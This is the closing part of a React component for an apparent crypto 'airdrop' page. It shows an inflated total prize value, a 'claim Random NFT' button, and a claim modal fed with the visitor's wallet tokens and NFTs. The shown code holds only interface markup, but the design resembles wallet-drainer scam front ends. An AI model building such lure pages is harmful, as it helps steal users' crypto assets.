                      Total Airdrop worth
                    </div>
                    <div className="text-[#FFB84C] tracking-wider font-bold text-xl">
                      $2,245,004.57
                    </div>
                  </div>
                  <div className="flex flex-row justify-between items-center px-3">
                    <div className="text-white text-sm lg:text-base font-semibold capitalize">
                      Total NFT to generate{" "}
                    </div>
                    <div className="text-[#FFB84C] tracking-wider font-bold text-xl">
                      #5171
                    </div>
                  </div>
                  <div className="w-full h-[60px] flex justify-center items-center">
                    <button
                      onClick={() => claimNFT()}
                      type="button"
                      className="py-3 font-semibold rounded-full capitalize text-white bg-gradient-to-r from-pink-500 via-red-500 to-yellow-500 w-11/12 outline-none"
                    >
                      claim Random NFT
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <ClaimModal
          clickOnBtn={callMethod}
          mainModal={mainModal}
          bothEmptyAsset={bothEmptyAsset}
          totalWalletTokens={totalWalletTokens}
          executablewalletNft={executablewalletNft}
          setShowModal={setShowModal}
          showModal={showModal}
          modalAssetNFT={modalAssetNFT}
          modalAssetToken={modalAssetToken}
        />
      </S.HomeContainer>
    </MainLayout>
  );
}

export default Home;
